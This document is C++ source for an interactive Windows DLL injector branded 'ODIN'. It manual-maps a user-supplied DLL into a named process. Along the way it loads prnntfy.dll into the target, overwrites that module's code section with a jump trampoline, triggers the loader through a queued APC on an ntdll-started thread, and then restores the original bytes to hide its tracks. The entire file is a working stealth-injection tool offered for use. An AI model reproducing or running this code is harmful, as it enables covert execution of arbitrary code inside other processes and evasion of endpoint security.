#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>

#pragma comment(lib, "Psapi.lib")

using namespace std;

void SetConsoleColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void SlowPrint(const string& text, int delayMs = 1) {
    for (char c : text) {
        cout << c << flush;
        this_thread::sleep_for(chrono::milliseconds(delayMs));
    }
}

void PrintBanner() {
    SetConsoleColor(13);
    SlowPrint("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n", 0);
    SlowPrint("    ___  ____  ___ _   _ \n", 0);
    SlowPrint("   / _ \\|  _ \\|_ _| \\ | |\n", 0);
    SlowPrint("  | | | | | | || ||  \\| |\n", 0);
    SlowPrint("  | |_| | |_| || || |\\  |\n", 0);
    SlowPrint("   \\___/|____/___|_| \\_|\n", 0);
    SlowPrint("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n", 0);
    SetConsoleColor(7);
    cout << endl;
    SetConsoleColor(8);
    SlowPrint("                        DEV BY ODIN\n", 0);
    SetConsoleColor(7);
    cout << endl;
    SetConsoleColor(13);
    SlowPrint("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n", 0);
    SetConsoleColor(7);
    cout << endl;
}

string GetInput(const string& prompt) {
    SetConsoleColor(10);
    cout << prompt;
    SetConsoleColor(7);
    string input;
    getline(cin, input);
    
    if (!input.empty() && input.front() == '"' && input.back() == '"') {
        input = input.substr(1, input.length() - 2);
    }
    
    return input;
}

void PrintStatus(const string& message, int color = 7) {
    SetConsoleColor(color);
    cout << message << endl;
    SetConsoleColor(7);
}

void PrintProgress(const string& message) {
    SetConsoleColor(11);
    cout << "[*] " << message;
    SetConsoleColor(7);
    for (int i = 0; i < 3; i++) {
        this_thread::sleep_for(chrono::milliseconds(300));
        cout << "." << flush;
    }
    cout << endl;
}

using f_LoadLibraryA = HINSTANCE(WINAPI*)(const char* lpLibFilename);
using f_GetProcAddress = FARPROC(WINAPI*)(HMODULE hModule, LPCSTR lpProcName);
using f_DLL_ENTRY_POINT = BOOL(WINAPI*)(void* hDll, DWORD dwReason, void* pReserved);

#ifdef _WIN64
using f_RtlAddFunctionTable = BOOLEAN(WINAPI*)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);
#endif

struct MANUAL_MAPPING_DATA {
    f_LoadLibraryA pLoadLibraryA;
    f_GetProcAddress pGetProcAddress;
#ifdef _WIN64
    f_RtlAddFunctionTable pRtlAddFunctionTable;
#endif
    BYTE* pbase;
    HINSTANCE hMod;
    DWORD fdwReasonParam;
    LPVOID reservedParam;
    BOOL SEHSupport;
};

#ifdef _WIN64
#define CURRENT_ARCH IMAGE_FILE_MACHINE_AMD64
#define RELOC_FLAG(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_DIR64)
#else
#define CURRENT_ARCH IMAGE_FILE_MACHINE_I386
#define RELOC_FLAG(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_HIGHLOW)
#endif

#pragma runtime_checks("", off)
#pragma optimize("", off)
void __stdcall Shellcode(MANUAL_MAPPING_DATA* pData) {
    if (!pData) return;

    BYTE* pBase = pData->pbase;
    auto* pOpt = &reinterpret_cast<IMAGE_NT_HEADERS*>(pBase + reinterpret_cast<IMAGE_DOS_HEADER*>(pBase)->e_lfanew)->OptionalHeader;

    auto _LoadLibraryA = pData->pLoadLibraryA;
    auto _GetProcAddress = pData->pGetProcAddress;
#ifdef _WIN64
    auto _RtlAddFunctionTable = pData->pRtlAddFunctionTable;
#endif

    BYTE* LocationDelta = pBase - pOpt->ImageBase;
    if (LocationDelta && pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        auto* pRelocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        auto* pRelocEnd = reinterpret_cast<IMAGE_BASE_RELOCATION*>((BYTE*)pRelocData + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

        while (pRelocData < pRelocEnd && pRelocData->SizeOfBlock) {
            UINT count = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* pRelativeInfo = reinterpret_cast<WORD*>(pRelocData + 1);

            for (UINT i = 0; i < count; ++i) {
                if (RELOC_FLAG(pRelativeInfo[i])) {
                    UINT_PTR* pPatch = reinterpret_cast<UINT_PTR*>(pBase + pRelocData->VirtualAddress + (pRelativeInfo[i] & 0xFFF));
                    *pPatch += (UINT_PTR)LocationDelta;
                }
            }
            pRelocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>((BYTE*)pRelocData + pRelocData->SizeOfBlock);
        }
    }

    if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        auto* pImportDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        while (pImportDesc->Name) {
            char* szMod = (char*)(pBase + pImportDesc->Name);
            HINSTANCE hDll = _LoadLibraryA(szMod);

            ULONG_PTR* pThunkRef = (ULONG_PTR*)(pBase + pImportDesc->OriginalFirstThunk);
            ULONG_PTR* pFuncRef = (ULONG_PTR*)(pBase + pImportDesc->FirstThunk);

            if (!pThunkRef) pThunkRef = pFuncRef;

            for (; *pThunkRef; ++pThunkRef, ++pFuncRef) {
                if (IMAGE_SNAP_BY_ORDINAL(*pThunkRef)) {
                    *pFuncRef = (ULONG_PTR)_GetProcAddress(hDll, (char*)(*pThunkRef & 0xFFFF));
                }
                else {
                    auto* pImport = (IMAGE_IMPORT_BY_NAME*)(pBase + (*pThunkRef));
                    *pFuncRef = (ULONG_PTR)_GetProcAddress(hDll, pImport->Name);
                }
            }
            ++pImportDesc;
        }
    }

    if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
        auto* pTLS = (IMAGE_TLS_DIRECTORY*)(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        auto* pCallback = (PIMAGE_TLS_CALLBACK*)(pTLS->AddressOfCallBacks);
        for (; pCallback && *pCallback; ++pCallback)
            (*pCallback)(pBase, DLL_PROCESS_ATTACH, nullptr);
    }

#ifdef _WIN64
    if (pData->SEHSupport && pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size) {
        _RtlAddFunctionTable(
            (PRUNTIME_FUNCTION)(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress),
            pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY),
            (DWORD64)pBase
        );
    }
#endif

    auto DllMain = (f_DLL_ENTRY_POINT)(pBase + pOpt->AddressOfEntryPoint);
    DllMain(pBase, pData->fdwReasonParam, pData->reservedParam);
}

void __stdcall ShellcodeEnd() { }
#pragma runtime_checks("", restore)
#pragma optimize("", on)

bool ModuleStompingInject(HANDLE hProc, BYTE* pSrcData, SIZE_T FileSize, DWORD targetPID) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)pSrcData;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        PrintStatus("[!] Invalid DOS signature", 12);
        return false;
    }

    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)(pSrcData + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        PrintStatus("[!] Invalid NT signature", 12);
        return false;
    }

    if (ntHeader->FileHeader.Machine != CURRENT_ARCH) {
        PrintStatus("[!] Architecture mismatch", 12);
        return false;
    }

    PrintProgress("Allocating memory in target process");
    BYTE* targetBase = (BYTE*)VirtualAllocEx(hProc, nullptr, ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!targetBase) {
        PrintStatus("[!] Failed to allocate memory", 12);
        return false;
    }

    MANUAL_MAPPING_DATA data = {};
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
#ifdef _WIN64
    data.pRtlAddFunctionTable = RtlAddFunctionTable;
#endif
    data.pbase = targetBase;
    data.fdwReasonParam = DLL_PROCESS_ATTACH;
    data.SEHSupport = true;

    PrintProgress("Writing PE headers");
    if (!WriteProcessMemory(hProc, targetBase, pSrcData, 0x1000, nullptr)) {
        PrintStatus("[!] Failed to write headers", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        return false;
    }

    PrintProgress("Writing sections");
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeader);
    for (UINT i = 0; i < ntHeader->FileHeader.NumberOfSections; ++i, ++section) {
        if (section->SizeOfRawData == 0) continue;

        if (!WriteProcessMemory(hProc, targetBase + section->VirtualAddress,
            pSrcData + section->PointerToRawData,
            section->SizeOfRawData, nullptr)) {
            PrintStatus("[!] Failed to write section", 12);
            VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
            return false;
        }
    }

    PrintProgress("Allocating shellcode");
    size_t shellcodeSize = (BYTE*)ShellcodeEnd - (BYTE*)Shellcode;
    void* remoteData = VirtualAllocEx(hProc, nullptr, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    void* remoteShell = VirtualAllocEx(hProc, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteData || !remoteShell) {
        PrintStatus("[!] Failed to allocate shellcode memory", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        return false;
    }

    if (!WriteProcessMemory(hProc, remoteData, &data, sizeof(data), nullptr) ||
        !WriteProcessMemory(hProc, remoteShell, (LPVOID)Shellcode, shellcodeSize, nullptr)) {
        PrintStatus("[!] Failed to write shellcode", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteShell, 0, MEM_RELEASE);
        return false;
    }

    DWORD oldProtect;
    VirtualProtectEx(hProc, remoteShell, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    PrintProgress("Enumerating modules for stomping");
    HMODULE hModules[1024];
    DWORD cbNeeded;
    
    if (!EnumProcessModules(hProc, hModules, sizeof(hModules), &cbNeeded)) {
        PrintStatus("[!] Failed to enumerate modules", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteShell, 0, MEM_RELEASE);
        return false;
    }

    PVOID targetModule = NULL;
    PVOID targetFunction = NULL;

    bool prnntfyFound = false;
    for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
        char moduleName[MAX_PATH];
        if (GetModuleFileNameExA(hProc, hModules[i], moduleName, sizeof(moduleName))) {
            char lowerName[MAX_PATH];
            strcpy_s(lowerName, moduleName);
            _strlwr_s(lowerName);
            
            if (strstr(lowerName, "prnntfy.dll")) {
                prnntfyFound = true;
                break;
            }
        }
    }

    if (!prnntfyFound) {
        PrintProgress("Loading prnntfy.dll into target");
        const char* prnntfyPath = "C:\\Windows\\System32\\prnntfy.dll";
        
        SIZE_T pathLen = strlen(prnntfyPath) + 1;
        LPVOID remotePath = VirtualAllocEx(hProc, nullptr, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (remotePath && WriteProcessMemory(hProc, remotePath, prnntfyPath, pathLen, nullptr)) {
            HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
            FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
            
            if (pLoadLibraryA) {
                HANDLE hLoadThread = CreateRemoteThread(hProc, NULL, 0, 
                    (LPTHREAD_START_ROUTINE)pLoadLibraryA, remotePath, 0, NULL);
                
                if (hLoadThread) {
                    WaitForSingleObject(hLoadThread, 5000);
                    CloseHandle(hLoadThread);
                    Sleep(1000);
                }
            }
            VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        }

        EnumProcessModules(hProc, hModules, sizeof(hModules), &cbNeeded);
    }

    for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
        char moduleName[MAX_PATH];
        if (GetModuleFileNameExA(hProc, hModules[i], moduleName, sizeof(moduleName))) {
            char lowerName[MAX_PATH];
            strcpy_s(lowerName, moduleName);
            _strlwr_s(lowerName);

            if (!strstr(lowerName, "prnntfy.dll")) {
                continue;
            }

            MODULEINFO modInfo;
            if (GetModuleInformation(hProc, hModules[i], &modInfo, sizeof(modInfo))) {
                BYTE headerBuffer[0x1000];
                SIZE_T bytesRead;
                
                if (ReadProcessMemory(hProc, modInfo.lpBaseOfDll, headerBuffer, sizeof(headerBuffer), &bytesRead)) {
                    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)headerBuffer;
                    if (dosHdr->e_magic == IMAGE_DOS_SIGNATURE) {
                        PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(headerBuffer + dosHdr->e_lfanew);
                        if (ntHdr->Signature == IMAGE_NT_SIGNATURE) {
                            PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(ntHdr);
                            for (WORD s = 0; s < ntHdr->FileHeader.NumberOfSections; s++, sect++) {
                                if (strcmp((char*)sect->Name, ".text") == 0) {
                                    targetModule = modInfo.lpBaseOfDll;
                                    targetFunction = (PVOID)((ULONG_PTR)modInfo.lpBaseOfDll + sect->VirtualAddress);
                                    goto found_target;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

found_target:
    if (!targetModule || !targetFunction) {
        PrintStatus("[!] No suitable module found for stomping", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteShell, 0, MEM_RELEASE);
        return false;
    }

    BYTE originalBytes[0x100];
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProc, targetFunction, originalBytes, sizeof(originalBytes), &bytesRead)) {
        PrintStatus("[!] Failed to read original bytes", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteShell, 0, MEM_RELEASE);
        return false;
    }

    DWORD oldProtect2;
    if (!VirtualProtectEx(hProc, targetFunction, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect2)) {
        PrintStatus("[!] Failed to change protection", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteShell, 0, MEM_RELEASE);
        return false;
    }

    PrintProgress("Writing trampoline");
    BYTE trampoline[] = {
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0
    };
    *(PVOID*)(trampoline + 2) = remoteData;
    *(PVOID*)(trampoline + 12) = remoteShell;

    if (!WriteProcessMemory(hProc, targetFunction, trampoline, sizeof(trampoline), nullptr)) {
        PrintStatus("[!] Failed to write trampoline", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteShell, 0, MEM_RELEASE);
        return false;
    }

    PrintProgress("Queuing APC to worker thread");
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        PrintStatus("[!] Failed to create thread snapshot", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteShell, 0, MEM_RELEASE);
        return false;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    int apcQueued = 0;

    typedef NTSTATUS(NTAPI* pNtQueryInformationThread)(HANDLE, LONG, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationThread NtQueryInformationThread = 
        (pNtQueryInformationThread)GetProcAddress(hNtdll, "NtQueryInformationThread");

    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == targetPID) {
                HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread) {
                    if (NtQueryInformationThread) {
                        PVOID startAddress = NULL;
                        NTSTATUS status = NtQueryInformationThread(hThread, 9, &startAddress, sizeof(PVOID), NULL);
                        
                        if (status == 0 && startAddress) {
                            MODULEINFO modInfo;
                            HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
                            if (GetModuleInformation(GetCurrentProcess(), hNtdllModule, &modInfo, sizeof(modInfo))) {
                                PVOID ntdllBase = modInfo.lpBaseOfDll;
                                PVOID ntdllEnd = (PVOID)((ULONG_PTR)ntdllBase + modInfo.SizeOfImage);
                                
                                if (startAddress >= ntdllBase && startAddress < ntdllEnd) {
                                    if (QueueUserAPC((PAPCFUNC)remoteShell, hThread, (ULONG_PTR)remoteData)) {
                                        apcQueued++;
                                        CloseHandle(hThread);
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);

    if (apcQueued == 0) {
        PrintStatus("[!] Failed to queue APC", 12);
        VirtualFreeEx(hProc, targetBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteShell, 0, MEM_RELEASE);
        return false;
    }

    PrintProgress("Waiting for execution");
    Sleep(15000);

    PrintProgress("Restoring original bytes");
    WriteProcessMemory(hProc, targetFunction, originalBytes, bytesRead, nullptr);
    VirtualProtectEx(hProc, targetFunction, 0x1000, oldProtect2, &oldProtect2);

    return true;
}

DWORD GetProcessIdByName(const wstring& name) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, name.c_str()) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

BYTE* ReadDllFile(const wstring& path, SIZE_T& fileSize) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        return nullptr;
    }

    fileSize = GetFileSize(hFile, nullptr);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return nullptr;
    }

    BYTE* pData = new BYTE[fileSize];
    DWORD bytesRead;

    if (!ReadFile(hFile, pData, fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
        delete[] pData;
        CloseHandle(hFile);
        return nullptr;
    }

    CloseHandle(hFile);
    return pData;
}

int main() {
    PrintBanner();
    
    PrintStatus("[*] Interactive Mode\n", 10);
    
    string processName = GetInput("Enter process name: ");
    if (processName.empty()) {
        PrintStatus("\n[!] Error: Process name cannot be empty", 12);
        PrintStatus("\nPress any key to exit...", 8);
        cin.get();
        return 1;
    }
    
    cout << endl;
    string dllPath = GetInput("Enter DLL path: ");
    if (dllPath.empty()) {
        PrintStatus("\n[!] Error: DLL path cannot be empty", 12);
        PrintStatus("\nPress any key to exit...", 8);
        cin.get();
        return 1;
    }
    
    cout << endl;
    SetConsoleColor(13);
    SlowPrint("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n", 0);
    SetConsoleColor(7);
    cout << endl;
    
    PrintProgress("Finding target process");
    wstring wProcessName(processName.begin(), processName.end());
    DWORD PID = GetProcessIdByName(wProcessName);
    if (PID == 0) {
        PrintStatus("\n[!] Process not found", 12);
        PrintStatus("\nPress any key to exit...", 8);
        cin.get();
        return 1;
    }
    PrintStatus("[+] Found PID: " + to_string(PID), 10);
    
    PrintProgress("Opening process");
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (!hProc) {
        PrintStatus("\n[!] Failed to open process", 12);
        PrintStatus("\nPress any key to exit...", 8);
        cin.get();
        return 1;
    }
    PrintStatus("[+] Process opened", 10);
    
    PrintProgress("Reading DLL file");
    wstring wDllPath(dllPath.begin(), dllPath.end());
    SIZE_T dllSize = 0;
    BYTE* dllBytes = ReadDllFile(wDllPath, dllSize);
    if (!dllBytes || dllSize == 0) {
        PrintStatus("\n[!] Failed to read DLL file", 12);
        CloseHandle(hProc);
        PrintStatus("\nPress any key to exit...", 8);
        cin.get();
        return 1;
    }
    PrintStatus("[+] DLL loaded (" + to_string(dllSize) + " bytes)", 10);
    
    cout << endl;
    bool success = ModuleStompingInject(hProc, dllBytes, dllSize, PID);
    
    CloseHandle(hProc);
    delete[] dllBytes;
    
    cout << endl;
    SetConsoleColor(13);
    SlowPrint("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n", 0);
    SetConsoleColor(7);
    cout << endl;
    
    if (success) {
        PrintStatus("[+] Injection completed successfully!", 10);
    }
    else {
        PrintStatus("[!] Injection failed", 12);
    }
    
    cout << endl;
    PrintStatus("Press any key to exit...", 8);
    cin.get();
    
    return success ? 0 : 1;
}
